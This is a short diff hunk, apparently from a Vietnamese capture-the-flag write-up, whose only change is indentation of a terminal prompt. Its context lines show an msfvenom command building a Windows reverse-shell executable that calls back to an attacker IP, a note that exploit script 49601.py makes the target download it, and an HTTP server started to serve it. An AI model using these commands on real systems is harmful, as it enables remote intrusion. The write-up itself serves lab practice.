@@ -136,7 +136,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.34.216 LPORT=4445 -f exe -o
 ```
 - 49601.py là 1 file chạy bằng python2 , nó lợi dụng lỗ hỏng để yêu cầu mục tiêu tải revshell về
 ```
-  ┌──(kai0kid㉿Kai0Kid)-[~/Temp]
+┌──(kai0kid㉿Kai0Kid)-[~/Temp]
 └─$ python3 -m http.server 80 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
